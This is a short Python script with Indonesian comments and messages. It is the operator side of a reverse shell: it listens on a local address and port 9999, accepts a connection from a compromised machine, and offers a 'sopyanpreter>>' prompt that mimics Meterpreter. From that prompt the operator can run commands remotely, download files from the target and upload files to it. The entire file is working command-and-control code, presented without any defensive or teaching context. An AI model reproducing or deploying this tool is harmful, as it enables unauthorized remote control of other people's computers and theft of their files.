import socket
import json
import os

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(("192.168.1.13", 9999))
print("menunggu koneksi...")
soc.listen(1)

koneksi = soc.accept()
_target = koneksi[0]
ip = koneksi[1]
print(_target)
print(f"Terhubung ke {str(ip)}")

def data_diterima():
    data = ""
    while True:
        try:
            data = data + _target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(namaFile):
    file = open(namaFile, "wb")
    _target.settimeout(1)
    _file = _target.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = _target.recv(1024)
        except :
            print("berhasil di download")
            break

    _target.settimeout(None)
    file.close()

def upload_file(namaFile):
    file = open(namaFile, "rb")
    _target.send(file.read())
    file.close()

def komunikasi_shell():
    while True:
        perintah = input("sopyanpreter>> ")
        data = json.dumps(perintah)
        _target.send(data.encode())
        if perintah in ("exit", "quit"):
            break
        elif perintah == "clear":
            os.system("clear")
        elif perintah[:3] == "cd ":
            pass
        elif perintah[:8] == "download":
            download_file(perintah[9:])
        elif perintah[:6] == "upload":
            upload_file(perintah[7:])
        else:
            hasil = data_diterima()
            print(hasil)
    
komunikasi_shell()